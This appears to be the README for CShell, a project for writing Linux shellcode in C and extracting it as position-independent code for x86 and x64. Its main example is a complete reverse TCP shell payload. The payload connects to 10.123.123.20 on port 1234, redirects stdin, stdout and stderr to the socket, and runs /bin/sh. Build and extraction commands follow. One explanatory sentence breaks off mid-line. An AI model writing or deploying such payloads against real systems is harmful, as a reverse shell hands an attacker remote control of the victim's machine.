# CShell
-------
### "portable" and rapid Linux shellcode development
Writing platform-specific shellcode is a notoriously tedious feat and requires a working understanding of low level assembly code. Rather than learning assembly syntax for x86, x64, ARM, and whatever god forksaken architecture you're targetting, it'd be a hell of a lot easier to simply write your entire payload in C, compile it with a standard C compiler, extract the `.text` section of the binary, and execute it as positionally independent shellcode.


### Warning
CShell is hugely incomplete... like seriously, only a tiny portion of the syscalls have been implemented for a small number of systems. There are a lot of potential caveats that need to be handled in different platforms, and I'm simply not that diverse of a developer when it comes to low level applications. I'm only providing the general idea and a basic template. Any PRs are more than welcome.


#### Notes:

 - Compiler size optimizations (such as GCC's `-Os`) may re-order functions (including `_start`) so if you use these flags, you may need to manually add a `jmp <offset>` to the beginning of your payload in order to get to the `_start` function.
 - The Makefile provided will compile with `-Os` optimizations excluding function and symbol re-alignment.
 - Your entry point should be called `_start`, not `main`, and may accept as many parameters of any type as you'd like, albeit an uncommon practice with shellcode.
 - You may, of course, utilize struct definitions, unions, enums, and preprocessor constants inside your code, but because it is compiled with `-nostdlib`, you must create your own functions for standard library functions `memset`/`memcpy` can be trivially implemented.
 
 
 ### What's the use case
 
Writing shellcode to perform a specific task can be tedious when targetting multiple platforms. Take, for instance, the simplest reverse TCP shell comprised of creating a socket, connecting to a remote address/port, using `dup2` to copy the `stdin`, `stdout`, and `stderr` file descriptors to the socket, and executing `/bin/sh` for an interactive shell. We could write three separate 


### Step 1: Write your payload

#include "cshell.h"

#define HTONS(A) ((((uint16_t)(A) & 0xff00) >> 8) | (((uint16_t)(A) & 0x00ff) << 8))
#define OCTETS(a, b, c, d) (uint32_t)((d << 24) | (c << 16) | (b << 8) | (a))

    /* An example CShell payload */

    int _start();

    int _start()
    {
        int sockfd, i;
        unsigned char filename[] = {'/', 'b', 'i', 'n', '/', 's', 'h', '\0'};
        ssize_t status, err;
        struct in_addr sock_addr;
        struct sockaddr_in sock_srv;

        status = cs_socket(AF_INET, SOCK_STREAM, 0);
        if(status < 0)
        {
            goto cleanup;
        }
        sockfd = status;

        sock_addr.s_addr = OCTETS(10, 123, 123, 20);

        sock_srv.sin_family = AF_INET;
        sock_srv.sin_port = HTONS(1234);
        sock_srv.sin_addr = sock_addr;

        status = cs_connect(sockfd, &sock_srv, sizeof(sock_srv));
        if(status < 0)
        {
            goto cleanup;
        }

        for(i = 0; i <= 2; ++i)
        {
            cs_dup2(sockfd, i);
        }

        cs_execve(filename, NULL, NULL);
        status = 0;

    close_cleanup:
        cs_close(sockfd);

    cleanup:
        if(status < 0)
        {
            err = cs_err(status);
        }
        else
        {
            err = 0;
        }

        cs_exit(err);
    }

### Step 2: Compile your payload

Assuming the above source file is saved as `cshell.c`, you can ue the `Makefile` inside the project.

    make x86 && make x64
    
### Step 3: Extract the .text section

    ./gettext.sh cshell-x86
    ./gettext.sh cshell-x64

The output can then be saved in `runshellcode.c` (be sure to compile it with -m32 when using x86) in order to test execution.
